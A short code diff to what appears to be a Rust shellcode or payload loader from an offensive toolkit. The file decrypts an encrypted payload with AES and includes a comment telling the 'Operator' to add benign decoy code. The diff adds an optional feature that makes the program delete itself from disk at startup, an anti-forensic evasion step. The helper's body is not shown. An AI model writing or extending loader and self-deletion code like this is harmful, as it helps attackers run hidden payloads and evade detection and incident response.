@@ -1,6 +1,9 @@
 use std::ffi::c_void;
 mod execution;
 
+#[cfg(feature = "UtilitySelfDeletion")]
+mod utilities;
+
 #[cfg(any(feature = "TinyAES", feature = "CTAES"))]
 use std::env;
 
@@ -92,6 +95,11 @@ fn decrypt_payload(encrypted: &[u8], key: &[u8], iv: &[u8]) -> Option<Vec<u8>> {
 }
 
 fn main() {
+
+    #[cfg(feature = "UtilitySelfDeletion")]
+    {
+        let _ = utilities::utils::delete_self_from_disk();
+    }
 
     /*
     For the Operator -> Write some benign code that is to be executed (Optional)
